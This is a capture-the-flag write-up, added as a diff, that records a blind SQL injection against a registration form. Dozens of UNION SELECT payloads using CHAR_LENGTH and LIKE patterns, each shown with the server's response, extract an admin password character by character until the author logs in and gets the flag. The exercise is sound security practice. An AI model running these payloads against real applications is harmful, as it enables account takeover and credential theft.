@@ -1,0 +1,89 @@
+Let me define these in the context of this solution:
+positive response = someone has already registered $username
+negative response = Registration has been disabled (meaning there is no user whose credentials match the query)
+
+The trick to this question is that the server will return a "positive response" when the query matches one or more rows OR when the query is invalid.  The server will return a "negative response" for valid queries which do NOT match any rows
+
+' UNION SELECT * from users where username = "admin" AND CHAR_LENGTH(password) > 0 -- ' -> Should be always true and indeed receives a positive response from server
+' UNION SELECT * from users where username = "admin" AND CHAR_LENGTH(password) > 5 -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND CHAR_LENGTH(password) > 10 -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND CHAR_LENGTH(password) > 20 -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND CHAR_LENGTH(password) > 26 -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND CHAR_LENGTH(password) > 27 -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "a%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%a%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_a%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%a" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%a_" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%a______" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%a%a______" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%b%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%c%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%d%" -- ' -> positive (there's a d!)
+' UNION SELECT * from users where username = "admin" AND password LIKE "%d" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%d%d" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e%" -- ' -> positive (there's an e!)
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e______________" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e%e______________" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e___e______________" --  ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e%e___e______________" --  ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e_e___e______________" --  ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%e%e_e___e______________" --  ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%g%" -- ' -> positive (there's a g!)
+' UNION SELECT * from users where username = "admin" AND password LIKE "__________g%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "__________g%g%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%h%" -- ' -> positive (there's an h!)
+' UNION SELECT * from users where username = "admin" AND password LIKE "________________h%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "________________h%h%" -- ' -> false
+' UNION SELECT * from users where username = "admin" AND password LIKE "%i%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_________________i%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_________________i%i%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%j%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%k%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%l%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "___l%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "___l%l%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "___ll%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "___ll%l%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%m%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%n%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_____n%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_____n%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_____n%n%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%o%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_o%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_o%o%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_o______________________o%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%o%%o%%o%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%p%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "___________________p%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "___________________p%p%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%q%" -- ' -> negative
+' UNION SELECT * from users where username = "admin" AND password LIKE "%r%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_________r%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_________r%r%" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "_________r_______________r%" -- ' -> positive
+
+At this point in the process, we have the partially reconstructed password: 
+.o.llne.erg.e...hi.pa...ord
+and we can make the assumption that the last 8 characters form the word "password"
+
+' UNION SELECT * from users where username = "admin" AND password LIKE "%password" -- ' -> positive (confirming our assumption)
+' UNION SELECT * from users where username = "admin" AND password LIKE "%s%password" -- ' -> positive (there's another s before the word 'password' appears)
+' UNION SELECT * from users where username = "admin" AND password LIKE "%spassword" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%s%spassword" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%s___spassword" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%s%s___spassword" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%ss___spassword" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%ss___spassword" -- ' -> positive
+' UNION SELECT * from users where username = "admin" AND password LIKE "%s%ss___spassword" -- ' -> negative
+
+At this point in the process, we have the partially reconstructed password: 
+.o.llne.erg.ess.hispassword
+and we can make the assumption that the password is "youllneverguessthispassword"
+
+Logged in!
+
+Your flag is: whereof_one_cannot_speak_thereof_one_must_be_silent
+
+Yes, this took exactly 90 minutes of SQL injection
